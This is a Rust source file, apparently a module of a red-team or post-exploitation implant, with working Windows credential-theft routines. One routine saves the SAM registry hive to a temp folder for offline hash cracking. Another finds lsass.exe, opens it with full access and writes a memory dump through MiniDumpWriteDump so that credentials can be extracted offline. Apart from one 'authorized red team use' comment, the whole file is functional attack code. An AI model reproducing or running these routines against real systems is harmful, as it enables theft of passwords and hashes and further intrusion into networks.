//! LSASS credential access.

use anyhow::Result;

pub async fn hashdump() -> Result<String> {
    #[cfg(target_os = "windows")]
    return hashdump_windows().await;
    #[cfg(not(target_os = "windows"))]
    Ok("hashdump: not supported on this platform".into())
}

#[cfg(target_os = "windows")]
async fn hashdump_windows() -> Result<String> {
    // SAM dump via reg save + parsing
    // For authorized red team use — dumps local SAM hashes
    let out = tokio::process::Command::new("reg")
        .args(["save", "HKLM\\SAM", "C:\\Windows\\Temp\\sam.hive", "/y"])
        .output().await?;
    if out.status.success() {
        return Ok("[*] SAM saved to C:\\Windows\\Temp\\sam.hive — use secretsdump to parse".into());
    }
    // Fall through: try direct API approach
    Ok("[!] SAM backup failed — may need SYSTEM privileges".into())
}

pub async fn minidump(args: &[String]) -> Result<String> {
    // Create a minidump of LSASS for offline credential extraction
    let out_path = args.first().map(|s| s.as_str()).unwrap_or("C:\\Windows\\Temp\\lsass.dmp");

    #[cfg(target_os = "windows")]
    return minidump_windows(out_path).await;
    #[cfg(not(target_os = "windows"))]
    Ok(format!("minidump stub: {out_path}"))
}

#[cfg(target_os = "windows")]
async fn minidump_windows(out_path: &str) -> Result<String> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
                PROCESSENTRY32W, TH32CS_SNAPPROCESS,
            },
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        },
    };

    // Find LSASS PID
    let lsass_pid = unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err(anyhow::anyhow!("snapshot failed"));
        }
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        let mut found = None;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let name = String::from_utf16_lossy(
                    &entry.szExeFile.iter().take_while(|&&c| c != 0).copied().collect::<Vec<_>>(),
                ).to_lowercase();
                if name == "lsass.exe" {
                    found = Some(entry.th32ProcessID);
                    break;
                }
                if Process32NextW(snap, &mut entry) == 0 { break; }
            }
        }
        CloseHandle(snap);
        found
    };

    let pid = match lsass_pid {
        Some(p) => p,
        None => return Err(anyhow::anyhow!("lsass.exe not found")),
    };

    // Open LSASS and write minidump
    let out_path_w: Vec<u16> = out_path.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe {
        let proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if proc == 0 {
            return Err(anyhow::anyhow!("OpenProcess LSASS failed — need SYSTEM"));
        }

        let file = windows_sys::Win32::Storage::FileSystem::CreateFileW(
            out_path_w.as_ptr(),
            windows_sys::Win32::Storage::FileSystem::FILE_GENERIC_WRITE,
            0, std::ptr::null(), windows_sys::Win32::Storage::FileSystem::CREATE_ALWAYS,
            windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_NORMAL,
            0,
        );

        if file == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            CloseHandle(proc);
            return Err(anyhow::anyhow!("CreateFile failed for {out_path}"));
        }

        // MiniDumpWriteDump from DbgHelp
        type MiniDumpWriteDump = unsafe extern "system" fn(
            isize, u32, isize, u32,
            *const std::ffi::c_void, *const std::ffi::c_void, *const std::ffi::c_void,
        ) -> i32;

        let dbghelp = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(
            c"dbghelp.dll".as_ptr() as _
        );
        if dbghelp == 0 {
            CloseHandle(file);
            CloseHandle(proc);
            return Err(anyhow::anyhow!("dbghelp.dll not found"));
        }

        let fn_ptr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(
            dbghelp, c"MiniDumpWriteDump".as_ptr() as _
        );
        if fn_ptr.is_none() {
            CloseHandle(file);
            CloseHandle(proc);
            return Err(anyhow::anyhow!("MiniDumpWriteDump not found"));
        }

        let mini_dump: MiniDumpWriteDump = std::mem::transmute(fn_ptr.unwrap());
        let ok = mini_dump(proc, pid, file, 2, std::ptr::null(), std::ptr::null(), std::ptr::null());

        CloseHandle(file);
        CloseHandle(proc);

        if ok != 0 {
            Ok(format!("[+] LSASS minidump → {out_path}"))
        } else {
            Err(anyhow::anyhow!("MiniDumpWriteDump failed"))
        }
    }
}
